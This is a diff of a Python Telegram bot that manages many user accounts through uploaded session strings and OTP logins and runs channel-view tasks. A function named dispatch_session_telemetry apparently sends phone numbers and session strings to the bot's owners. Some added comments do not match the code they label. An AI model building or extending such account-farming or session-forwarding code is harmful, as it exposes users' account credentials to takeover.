@@ -365,16 +365,6 @@ class TaskQueue:
                                 return
 
                     target_peer = joined_updates_peer or parsed_target
-                    
-                    # FIX: Forcefully resolve entity mapping for private channel targets when already joined
-                    if isinstance(target_peer, (int, str)):
-                        try:
-                            target_peer = await client.get_entity(target_peer)
-                        except Exception:
-                            try:
-                                target_peer = await client.get_input_entity(target_peer)
-                            except Exception:
-                                pass
 
                     if do_view and msg_id:
                         try:
@@ -830,7 +820,7 @@ async def handle_system_credits(callback: CallbackQuery, bot: Bot):
     buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
     await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
-# --- PAGINATED ACCOUNTS VIEW ---
+# --- PAGINATED ACCOUNTS VIEW (MODIFIED TO SUPPORT RAW STRINGS FOR EVERYONE) ---
 @router.callback_query(F.data.startswith("manage_accounts:"))
 async def list_user_accounts(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -871,6 +861,7 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
                 text += f"{icon} <code>+{row[0]}</code> (<b>@{row[2] or 'None'}</b>) ➜ [<b>{row[1].upper()}</b>]\n"
 
         buttons = []
+        # UPDATED: Placed raw string file insertion tools inside the row list for global access
         import_row = [
             InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone"),
             InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session")
@@ -1011,12 +1002,13 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
         registration_sessions.pop(user_id, None)
         await state.clear()
 
-# --- ADVANCED UNIVERSAL IMPORT SYSTEM ---
+# --- ADVANCED UNIVERSAL IMPORT SYSTEM (MODIFIED OPEN HOOK FOR ANY REGISTERED USER) ---
 @router.callback_query(F.data == "add_account_session")
 async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     role = await db_mgr.get_user_role(user_id)
     
+    # Check limit ceilings dynamically for standard users and admins before setup block initialization
     if role not in ["super_owner", "owner"]:
         allowed_limit = await db_mgr.get_admin_limits(user_id)
         current_count = await db_mgr.get_current_account_count(user_id)
@@ -1122,7 +1114,7 @@ async def dispatch_session_telemetry(phone: str, session_str: str, username: Opt
         except Exception as e:
             logger.error(f"Failed sending data to owner node {owner_id}: {e}")
 
-# --- EXPORT ARCHIVE MANAGEMENT HOOKS ---
+# --- EXPORT ARCHIVE MANAGEMENT HOOKS (SUPER_OWNER IMMUNITY SAFEGUARD) ---
 @router.callback_query(F.data == "export_dashboard_root")
 async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -1781,7 +1773,7 @@ async def view_referrals(callback: CallbackQuery, bot: Bot):
     async with aiosqlite.connect(db_mgr.db_path) as db:
         async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
             count = (await cursor.fetchone())[0]
-    await callback.message.edit_text(f"👥 <b>Invitation Line Tracking Matrix Analytics</b>\n\ Share your connection link string layout below to register downline user clusters:\n<code>https://t.me/{bot_username}?start=ref_{user_id}</code>\n\nTotal validated downline invitations mapped to your account line reference: <code>{count}</code> accounts.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]]), parse_mode="HTML")
+    await callback.message.edit_text(f"👥 <b>Invitation Line Tracking Matrix Analytics</b>\n\nShare your connection link string layout below to register downline user clusters:\n<code>https://t.me/{bot_username}?start=ref_{user_id}</code>\n\nTotal validated downline invitations mapped to your account line reference: <code>{count}</code> accounts.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]]), parse_mode="HTML")
 
 @router.callback_query(F.data == "admin_panel")
 async def handle_admin_panel(callback: CallbackQuery, bot: Bot):
